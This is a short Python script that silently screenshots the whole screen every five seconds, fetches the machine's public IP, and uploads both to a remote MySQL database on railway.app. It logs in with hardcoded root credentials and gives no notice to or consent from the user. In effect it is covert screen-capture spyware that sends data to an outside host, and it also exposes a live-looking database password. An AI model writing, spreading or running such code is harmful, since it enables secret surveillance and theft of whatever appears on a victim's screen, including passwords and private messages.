import pyautogui
import pymysql
import time
import requests

# Connect to the database
connection = pymysql.connect(
    host='containers-us-west-16.railway.app',
    user='root',
    port=6302,
    password='wYBhwOG3dfPum7uvjoh1',
    db='images',
    cursorclass=pymysql.cursors.DictCursor
)

while True:
    # Take screenshot
    screenshot = pyautogui.screenshot()

    # Open image file
    image = open('screenshot.png', 'wb')
    
    # Write the image file
    screenshot.save(image)
    
    # Close the image file
    image.close()

    # Open the image file to read it as binary data
    with open('screenshot.png', 'rb') as image:
        # Convert the image data to a binary string
        image_data = image.read()

    try:
        # Create a cursor object
        with connection.cursor() as cursor:
            
            # Insert the image data into the database
            ip = requests.get('https://api.ipify.org').text
            sql = "INSERT INTO images (screenshot, ip) VALUES (%s, %s)"
            cursor.execute(sql, (image_data, ip))
            # Commit the changes
            connection.commit()
    finally:
        # Close the cursor and the connection
        cursor.close()
    
    # Sleep for 5 seconds
    time.sleep(5)

connection.close()
